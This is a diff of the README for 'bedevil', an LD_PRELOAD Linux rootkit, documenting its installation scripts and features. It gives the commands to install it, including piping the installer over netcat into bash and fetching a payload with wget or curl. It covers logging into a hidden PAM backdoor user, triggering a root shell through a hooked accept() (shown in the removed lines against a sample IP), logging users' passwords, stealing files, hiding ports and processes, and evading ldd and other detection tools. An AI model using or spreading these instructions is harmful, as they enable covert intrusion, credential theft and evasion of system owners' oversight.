@@ -1,62 +1,38 @@
 # bedevil
 
-<img src="https://i.imgur.com/PyO00vy.png">
+<img src=https://i.imgur.com/PyO00vy.png alt="icon" />
 
 </br>
 
  * Based on my other rootkit, [vlany](https://github.com/mempodippy/vlany)
  * bedevil is designed to be more robust, faster and efficient than vlany.
 
-## Aim of bedevil
- * Ultimately, my core aim is to tidy up previously existing aspects of precursor rootkits, fix outstanding issues and create a more manageable & _robust_ system of rootkit functionalities.
- * This is in an effort to make it easier on (not just) me when it comes to managing the rootkit's different functionalities.
- * In addtion, considering the point above, I have also made an effort to optionally minimalise the amount of dependencies required to install the kit on a machine.
+## Overview
+ * This is an LD_PRELOAD rootkit. Therefore, this rootkit runs in userland.
+ * During the creation of this rootkit I had some goals in mind.
+   * Tidy up previously existing aspects of precursor (LD_PRELOAD) rootkits.
+   * Fix outstanding issues. (from vlany)
+   * Create a more manageable & _robust_ system of rootkit functionalities.
+   * Working on anything in vlany just felt like a huge mess, I grew to hate this. I knew it could be better...
+ * The only dependency inherently required is bash, for running all of the setup scripts.
+   * This won't be the case for much longer...
+ * When it comes to actual rootkit dependencies, there are only a few.
+   * Most will already be installed.
+   * Those that aren't can be installed with the available script.
 
-</hr>
 
-## Important files
-*(inc/)*
- * [__toggles.h__](https://github.com/kcaaj/bdvl/blob/master/inc/toggles.h): rootkit functionality toggles. read for more info
- * [__includes.h__](https://github.com/kcaaj/bdvl/blob/master/inc/includes.h): read for info
- * [__bedevil.h__](https://github.com/kcaaj/bdvl/blob/master/inc/bedevil.h): essential rootkit header, handled solely by bedevil.sh
- * [__bedevil.c__](https://github.com/kcaaj/bdvl/blob/master/inc/bedevil.c): centre for all bedevil
+<hr>
 
-</hr>
+## bedevil.sh
+### Usage
 
-## `bedevil.sh`
-```
-$ ./bedevil.sh -h
+<img src=https://i.imgur.com/s9VloGH.png alt="bedevil.sh script output"/>
 
-   /$$                     /$$                   /$$/$$
-  | $$                    | $$                  |__| $$
-  | $$$$$$$  /$$$$$$  /$$$$$$$ /$$$$$$ /$$    /$$/$| $$
-  | $$__  $$/$$__  $$/$$__  $$/$$__  $|  $$  /$$| $| $$
-  | $$  \ $| $$$$$$$| $$  | $| $$$$$$$$\  $$/$$/| $| $$
-  | $$  | $| $$_____| $$  | $| $$_____/ \  $$$/ | $| $$
-  | $$$$$$$|  $$$$$$|  $$$$$$|  $$$$$$$  \  $/  | $| $$
-  |_______/ \_______/\_______/\_______/   \_/   |__|__/
-                                                     
-               LD_PRELOAD Linux rootkit
+ * __The order in which you pass flags to this script are essential.__
 
-  Usage: $0 [option(s)]
-      Options:
-          -h: Show this help message & exit.
-          -v: Output verbosely.
-          -e: Do an environment check. (RECOMMENDED)
-          -u: Enable use of 'dialog' throughout setup.
-          -t: Go through & switch rootkit toggles.
-          -C: Clean up installation/compilation mess.
-          -d: Configure rootkit headers & settings.
-          -z: After configuration has finished, compress the resulting
-              new include directory with gzip.
-          -c: Compile rootkit in current directory & exit.
-          -D: Install all potential required dependencies. (REQUIRES ROOT)
-          -i: Launch full installation of bedevil. (REQUIRES ROOT)
-
-```
- * __The order in which you use the flags is essential.__
- * *Compile only (no installation):* `./bedevil.sh -dc` (will quickly compile the .so in the your cwd)  
- * *Changing variable values (example):* `BD_UNAME=my_uname BD_PWD=my_pwd ./bedevil.sh -dc`  
+#### Usage examples
+ * *Compile only:* `./bedevil.sh -dc` (compile the rootkit in your cwd)  
+ * *Changing values (example):* `BD_UNAME=my_uname BD_PWD=my_pwd ./bedevil.sh -dc`  
  * *Full installation:* `./bedevil.sh -ti` (will ask what you want to enable/disable then launch installation)
  * *Mimic installation:* `LDSO_PRELOAD=/tmp/fakepreload ./bedevil.sh -i` (mimic rootkit installation/setup without preloading the rootkit)
  * **Compressing include directory & using resulting tarball**:
@@ -64,133 +40,138 @@ $ ./bedevil.sh -h
      * Using tarball: `TARBALL=./pathto.tar.gz ./bedevil.sh ...`
      * i.e.: `TARBALL=./pathto.tar.gz ./bedevil.sh -i/-c`
 
+<hr>
 
-## `auto.sh`
- * Automatic and instantaneous installation script for use with preconfigured installations.
- * Uses the resulting base64 encoded tar.gz archive created after compressing your setup.
-   * You need to change the location of this file in `auto.sh`, see 'B64TARGZ_LOCATION'. (literally first variable in the script)
-   * `auto.sh` uses either wget or curl to download this file.
-   * File is written as base64 by bedevil.sh for the sake of easier transfers between machines.
- * This script depends solely on the contents & format of the 'settings' & 'toggles.conf' files.
-   * Both of these files are written by `bedevil.sh` when compressing your new setup.
+## Example installation
+ * In this example, the command I issued was
+   * `BD_UNAME=sexlovegod ./bedevil.sh -i`
+
+<img src=https://i.imgur.com/e5Oc8kt.png alt="Example installation result"/>
+
+* If `etc/id_rsa.pub` exists before installation, it will be copied to your installation directory as an authorized key for ssh login.
+
+### Logging in to new backdoor user
+ * Upon successful installation you can log in to the box using your backdoor credentials.
+
+<img src=https://i.imgur.com/MlsC2mN.png alt="Example connection to PAM backdoor." />
+
+ * _emule_ is just a box I've got running on my local network.
+ * If the box you're trying to log into has their ssh service open on a different port (not 22) you can specify a different port to use by changing the value of `SSH_PORT`, either at runtime or edit it in the script.
+ * Example: `bash SSH_PORT=23 etc/ssh.sh ...`
+
+<hr>
+
+## auto.sh
+ * Instant installation script for use with preconfigured setups.
+ * Uses the base64'd tar.gz archive created after compression.
+   * You need to change where this script will try to get this file from.
+     * See `B64TARGZ_LOCATION`.
+   * `wget`/`curl` is required for downloading the file.
+     * You could instruct the script to use a file available locally, instead of trying to download one.
+ * This script relies on the contents & format of the 'settings' & 'toggles.conf' files.
+   * Both of these files are written by `bedevil.sh` during compression.
+   * This method of storing settings could be better than what it is right now.
+   * But considering the purpose, this is ok.
  * At the stage this script is currently in, utilising the dynamic linker patch isn't as straight forward as it should/I'd like it to be.
 
-### Full example installation using `auto.sh` after `bedevil.sh`
+### Example
  * `BD_UNAME=[...] BD_PWD=[...] [...] ./bedevil.sh -vdz`
- * Then upload resulting new \*.so.inc.b64 somewhere. Change variable in auto.sh to its location.
+ * Upload resulting `*.so.inc.b64` somewhere.
+ * Change `B64TARGZ_LOCATION` accordingly.
    * `scp auto.sh root@host:/tmp/ && ssh root@host 'bash /tmp/auto.sh'`
-   * Or... with nc listening on a port with root privs.
+   * Or... with nc.
      * `# nc -vlp 1234 | bash`
      * `$ cat /tmp/auto.sh | nc h.o.s.t 1234`
-     * If doing something like this, you could use SSL too!
  * Rootkit will then be installed as per usual, just in a fraction of the time compared to before.
-   * One slight issue is that the `patch_sshdconfig` function in `etc/postinstall.sh` doesn't get executed.
-   * Small price to pay & if that's such an issue you can do it yourself.
+   * Something worth noting is that `patch_sshdconfig` doesn't exist here.
+   * Whereas it normally would, and be executed, with `bedevil.sh`.
+   * Small price to pay.
+   * If this proves to be problematic, you can do it yourself.
+   * See `etc/postinstall.sh` for this function.
 
-</hr>
+<hr>
 
-## Rootkit toggles
- * [`inc/toggles.h`](https://github.com/kcaaj/bdvl/blob/master/inc/toggles.h) is just exactly as it sounds. By (un)defining different toggle definitions, you have more control what bedevil can & will do upon installation. Comments available.  
- * [`etc/toggles.sh`](https://github.com/kcaaj/bdvl/blob/master/etc/toggles.sh) is used by bedevil.sh to read, parse, and make changes to toggles.h without manual editing.
+## Features
+ * [`inc/toggles.h`](https://github.com/kcaaj/bdvl/blob/master/inc/toggles.h)
+   * Exactly what it sounds like.
+   * Provides a means of controlling what bedevil can & will do upon installation.
+   * Ample details within comments. 
+ * See the table below.
 
 | Toggle           | Info                                                         | Default status | Dependency | Ignored(?) |
 | :-------------   | :----------------------------------------------------------- | :------------- | :--------- | :--------- |
-| `USE_PAM_BD`     | allows interactive login as a backdoor user via ssh          | off            | libpam     | no         |
+| `USE_PAM_BD`     | allows interactive login as a backdoor user via ssh          | on            | libpam     | no         |
 | `USE_ACCEPT_BD`  | allows backdoor connection via running (& infected) services | off            | -          | no         |
 | `ACCEPT_USE_SSL` | to use SSL or not for the accept hook backdoor               | off            | libssl     | no         |
-| `LOG_LOCAL_AUTH` | log local successful user authentications                    | off            | libpam     | no         |
+| `LOG_LOCAL_AUTH` | log successful user authentications on the box                   | off            | libpam     | no         |
 | `HIDE_SELF`      | hides files and processes based on rootkit magic GID         | on             | -          | yes        |
 | `FORGE_MAPS`     | hides rootkit presence from process map files                | on             | -          | yes        |
 | `HIDE_PORTS`     | hides ports & port ranges defined in 'hide_ports' file       | on             | -          | yes        |
 | `DO_REINSTALL`   | maintains the rootkit's preload file                         | on             | -          | yes        |
 | `DO_EVASIONS`    | hides rootkit presence from unsavoury processes              | on             | -          | yes        |
-| `HIDING_UTIL`    | allows (un)hiding of paths & of self (backdoor shell)        | on             | -          | yes        |
-| `LOG_SSH`        | logs outgoing ssh logins to install dir                      | off            | -          | no         |
+| `HIDING_UTIL`    | allows (un)hiding of paths & of self        | on             | -          | yes        |
+| `LOG_SSH`        | logs login attempts from over ssh                      | off            | -          | yes         |
 | `FILE_STEAL`     | attempts to steal FoI when opened by open/fopen              | off            | -          | no         |
 | `LINK_IF_ERR`    | link said FoI if we can't copy it                            | off            | -          | yes        |
 | `USE_CRYPT`      | to use or not to use libcrypt                                | on             | libcrypt   | yes        |
 
-</hr>
+<hr>
 
-## Feature information
+#### PAM backdoor
+ * By hijacking libpam & libc's authentication functions, we are able to create a phantom backdoor user.
+ * During installation you're given a username & password.
+   * By default the username & password are randomly generated.
+   * You can specify a username and/or password of your own by setting them before running `bedevil.sh`.
+     * i.e.: `BD_UNAME=myusername BD_PWD=mypassword ./bedevil.sh ...`
+ * [`etc/ssh.sh`](https://github.com/kcaaj/bdvl/blob/master/etc/ssh.sh) makes logging into your PAM backdoor with your hidden port that bit easier.
+ * The responsible [utmp & wtmp functions](https://github.com/kcaaj/bdvl/tree/master/inc/utmp) have been hooked & information that may have indicated a backdoor user on the box is no longer easily visible.
 
 #### Credential logging
- * When toggle `LOG_LOCAL_AUTH` is defined, bedevil intercepts function `pam_vprompt` and stores successful user authentications in the rootkit's installation directory.
- * When toggle `LOG_SSH` is defined, bedevil intercepts functions `read` and `write` to check if a user is attempting to log into an account via ssh.
-   * It's up to you to verify if the credentials used for logging into the account are correct, since the server in question will handle that.
-   * The written logs are available, too, in the rootkit's installation directory.
+ * `LOG_LOCAL_AUTH`
+   * bedevil will intercept `pam_vprompt` and log successful authentications on the box.
+   * Log results are available in your installation directory.
+ * `LOG_SSH`
+   * bedevil intercepts `read` and `write` in order to log login attempts over ssh.
+   * Again, logs are available in your installation directory.
 
-### Evasions & presence hiding
+<hr>
 
-#### Network port hiding
- * With bedevil installed, you can manually hide or unhide any specific ports/ranges on the box by editing the `hide_ports` file in the rootkit's installation directory.
+#### Evasion & hiding
+
+##### Port hiding
+ * With bedevil installed, you can hide or unhide any ports/ranges on the box by editing the `hide_ports` file in the rootkit's installation directory.
  * Additionally, before any configuration/setup, you can define what ports/ranges will be hidden by writing them to `inc/hide_ports`.
-i.e.:
 ```
 $ cat hide_ports
-4291
+9146
 304-306
 1000-1003
 ```
-*Where a hyphen represents a range...*
- * Upon installation, `bedevil.sh` will write which ports or port ranges should be hidden to the `hide_ports` file.
+*Where a hyphen is the range delimiter...*
 
-#### Rootkit presence hiding
+##### Rootkit presence
  * bedevil will hide itself from the process memory map files upon being read.
- * Reading `/proc/*/*maps`, when bedevil is fully installed will make it seem apparent that there is no malicious libraries being preloaded.
- * _HOWEVER_, should dependencies be required by the rootkit's compiled shared object, the dependent libraries will be visible in output. (namely; libcrypt & libssl)
+ * Reading `/proc/*/*maps`, when bedevil is installed won't reveal the kit's location.
+ * __HOWEVER__, dependencies required by the rootkit will be visible. (namely, libcrypt & libssl)
 
 ##### Scary things
- * bedevil will hide from defined scary processes, paths or environment variables.
- * See [`inc/hiding/evasion/evasion.h`](https://github.com/kcaaj/bdvl/blob/master/inc/hiding/evasion/evasion.h) for the things that bedevil will (do its utmost best) to hide from.
- * Subsequently subverting detection by temporarily 'uninstalling' the rootkit until given scary item has finished execution.
- * i.e.: Calling `ldd` on a dynamically linked binary will not reveal the location of the rootkit.
-   * Initially, calling `ldd` as a regular user will appear to show an incorrect permissions error, as the regular user doesn't have sufficient permissions required to be able to temporarily uninstall the rootkit.
-   * Calling `ldd` with sufficient permissions will uninstall the rootkit, show "clean" output to the user, then will reinstall. Obscuring the location of the rootkit.
-
-#### Backdoor
-Within bedevil, you can choose to use the PAM backdoor and/or the accept hook backdoor. There are pros and cons to using either method. In order to choose which backdoor method you would like to use, see the 'toggles' section closer to the beginning of this README. Also, there is a [README inside the rootkit's installation directory](https://github.com/kcaaj/bdvl/blob/master/etc/BD_README) that you may wish to consult.  
-When bedevil detects that a backdoor user is logged in, it automatically unsets specified environment variables, for the sake of remaining hidden... See [`inc/util/bdusr.c`](https://github.com/kcaaj/bdvl/blob/master/inc/util/bdusr.c) for the things that bedevil will unset in the environment upon detecting a present backdoor user/general rootkit process.
-
-##### PAM
- * By hijacking libpam's authentication functions, we create a phantom user on the machine that can be logged into just the same as any other user.
- * During setup, you'll be given a username and password which can be used to log into the backdoor, over ssh.
-   * To reiterate, by default the username and password are randomly generated, but you can specify a username and password of your own by setting them before running `bedevil.sh`.
-     * i.e.: `BD_UNAME=myusername BD_PWD=mypassword ./bedevil.sh ...`
- * See [`etc/ssh.sh`](https://github.com/kcaaj/bdvl/blob/master/etc/ssh.sh) on connecting to the infected box's PAM backdoor with your hidden port.
- * *By hooking the responsible [utmp & wtmp functions](https://github.com/kcaaj/bdvl/tree/master/inc/utmp), information that may give off indication of a PAM backdoor is throttled.*
- * *On boxes that use `systemd` (which is most), when a user (real-or-not) is logged in, a process called `(sd-pam)` will be visible.*
-
-##### accept() hook
- * By intercepting and hijacking libc's accept(), we can connect to existing services (__assuming they have been restarted upon installation__) on a box and have them drop us a reverse shell if special conditions are met.
- * When using `ACCEPT_PORT` as your local source port when connecting to said box, bedevil will drop you the shell when you correctly enter your backdoor password. (`BD_PWD`)
- * `ACCEPT_PORT` is by default a hidden port in `'hide_ports'`.
-
-###### SSL
- * If toggle `ACCEPT_USE_SSL` is defined, the source port you should use to trigger the use of SSL within the backdoor is just `$ACCEPT_PORT + 1`.
-   * *The plaintext backdoor is still available even when `ACCEPT_USE_SSL` is defined.*
-
-
- * Example connection to infected box (*where host is `213.82.46.164`, `ACCEPT_PORT` is 839 & `BD_PWD` is `'my_password'`*)
-```
-$ nc 213.82.46.164 22 -p 839
-my_password
-...
-uid=0(root) gid=666 groups=666
-...
-```
-
+ * bedevil will hide from defined scary processes, paths & environment variables.
+ * See [`inc/hiding/evasion/evasion.h`](https://github.com/kcaaj/bdvl/blob/master/inc/hiding/evasion/evasion.h) for the things that bedevil will evade.
+ * i.e.: Running `ldd`.
+   * Calling `ldd` as a regular user will show an error.
+   * This user's privileges do not suffice.
+   * The calling process __must__ have the power to uninstall & reinstall our rootkit.
+   * Running `ldd` again with sufficient privilege will show a totally clean output.
+   * This is because, during the runtime of (_in this case_) `ldd` the rootkit is not installed.
+   * Upon the application exiting/returning, the parent (rootkit) process of whatever just finished running reinstalls the rootkit.
 
 
 <!--
 
 RANDOM NOTES:
   having DO_EVASIONS enabled allows a 'bug' where a root user can
-  'permanently' uninstall the rootkit by running ldd through an infinite
+  uninstall the rootkit by running ldd through an infinite
   loop. i.e.: `while true; do ldd /bin/echo; done`
-  after this loop is interrupted, bedevil will reinstall itself, assuming
-  its necessary shared object file is present.
-
 
 LINKS OF INTEREST:
  - https://pastebin.com/rZvjDzFK
